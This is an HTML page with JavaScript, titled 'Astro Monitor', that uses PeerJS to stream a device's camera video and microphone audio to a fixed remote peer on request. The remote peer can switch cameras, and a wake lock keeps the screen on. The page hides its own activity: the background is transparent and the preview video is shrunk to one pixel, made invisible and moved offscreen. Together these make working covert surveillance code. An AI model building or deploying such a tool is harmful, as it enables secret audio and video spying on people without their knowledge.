<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Monitor - Remote Controlled Camera</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="localPreview" autoplay muted playsinline></video>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let dataConn = null;
        let currentCall = null;
        let currentStream = null;
        let currentCamera = "front";
        let wakeLock = null;
        
        let FRONT_CAMERA_ID = null;
        let BACK_CAMERA_ID = null;
        
        function log(msg) {
            console.log(`[MONITOR] ${msg}`);
        }
        
        async function detectCameras() {
            try {
                // Request permission first
                await navigator.mediaDevices.getUserMedia({ video: true });
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === "videoinput");
                
                log(`Found ${cameras.length} camera(s):`);
                cameras.forEach((cam, i) => {
                    log(`  [${i}] ${cam.label || 'Unnamed'}`);
                    
                    const label = cam.label.toLowerCase();
                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
                        BACK_CAMERA_ID = cam.deviceId;
                        log(`  ✅ BACK camera: ${cam.label}`);
                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
                        FRONT_CAMERA_ID = cam.deviceId;
                        log(`  ✅ FRONT camera: ${cam.label}`);
                    }
                });
                
                // Fallback based on index (0 is often back, 1 is front on Android)
                if (!BACK_CAMERA_ID && cameras[0]) {
                    BACK_CAMERA_ID = cameras[0].deviceId;
                    log(`  Using camera[0] as BACK`);
                }
                if (!FRONT_CAMERA_ID && cameras[1]) {
                    FRONT_CAMERA_ID = cameras[1].deviceId;
                    log(`  Using camera[1] as FRONT`);
                }
                
                return true;
            } catch (err) {
                log(`Camera detection failed: ${err.message}`);
                return false;
            }
        }
        
        async function getCameraStream(camera) {
            const isBack = (camera === 'back');
            const targetDeviceId = isBack ? BACK_CAMERA_ID : FRONT_CAMERA_ID;
            
            // Try deviceId first (most reliable)
            if (targetDeviceId) {
                try {
                    log(`Getting ${camera} with deviceId`);
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: true,
                        video: {
                            deviceId: { exact: targetDeviceId },
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });
                    log(`✅ ${camera} camera stream ready`);
                    return stream;
                } catch (err) {
                    log(`deviceId failed: ${err.message}`);
                }
            }
            
            // Fallback to facingMode
            try {
                log(`Falling back to facingMode for ${camera}`);
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: true,
                    video: {
                        facingMode: isBack ? "environment" : "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    }
                });
                log(`✅ ${camera} camera stream ready via facingMode`);
                return stream;
            } catch (err) {
                log(`facingMode failed: ${err.message}`);
            }
            
            // Final fallback
            log(`Using default camera for ${camera}`);
            return await navigator.mediaDevices.getUserMedia({
                audio: true,
                video: { width: { ideal: 640 }, height: { ideal: 480 } }
            });
        }
        
        async function startStream(camera) {
            // Close existing call if any
            if (currentCall) {
                currentCall.close();
                currentCall = null;
            }
            
            // Stop existing stream
            if (currentStream) {
                currentStream.getTracks().forEach(t => t.stop());
                currentStream = null;
            }
            
            log(`Starting stream with ${camera} camera...`);
            
            try {
                const stream = await getCameraStream(camera);
                currentStream = stream;
                currentCamera = camera;
                
                // Local preview (hidden)
                document.getElementById('localPreview').srcObject = stream;
                
                // Call remote
                currentCall = peer.call(PARTNER_ID, stream, {
                    metadata: { camera: camera, type: 'live' }
                });
                
                log(`✅ Streaming ${camera} camera to remote`);
                
                currentCall.on('close', () => {
                    log('Call closed');
                    currentCall = null;
                });
                
                currentCall.on('error', (err) => {
                    log(`Call error: ${err}`);
                });
                
            } catch (err) {
                log(`Failed to start stream: ${err.message}`);
            }
        }
        
        function handleDataMessage(data) {
            log(`Received command: ${data.type}`);
            
            if (data.type === 'switch_camera') {
                const targetCamera = data.camera;
                log(`Switching to ${targetCamera} camera...`);
                startStream(targetCamera);
            }
        }
        
        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing monitor as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', async () => {
                log(`✅ Monitor ACTIVE - ID: ${MY_ID}`);
                await detectCameras();
                log(`Ready for connection from ${PARTNER_ID}`);
                log('Waiting for remote to request camera stream...');
            });
            
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    log(`📡 Remote connected`);
                    dataConn = conn;
                    conn.on('data', handleDataMessage);
                    conn.on('close', () => {
                        log('Remote disconnected');
                        if (currentCall) currentCall.close();
                        currentCall = null;
                        dataConn = null;
                    });
                    
                    // Start with front camera by default
                    startStream('front');
                } else {
                    conn.close();
                }
            });
            
            peer.on('error', (err) => {
                log(`Error: ${err.type}`);
                if (err.type === 'unavailable-id') {
                    setTimeout(() => initPeer(), 5000);
                }
            });
        }
        
        log('╔════════════════════════════════╗');
        log('║   ASTRO MONITOR               ║');
        log('║   Remote Controlled Camera    ║');
        log('╚════════════════════════════════╝');
        
        preventScreenLock();
        initPeer();
        
        window.addEventListener('beforeunload', () => {
            if (currentCall) currentCall.close();
            if (peer) peer.destroy();
            if (currentStream) {
                currentStream.getTracks().forEach(t => t.stop());
            }
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
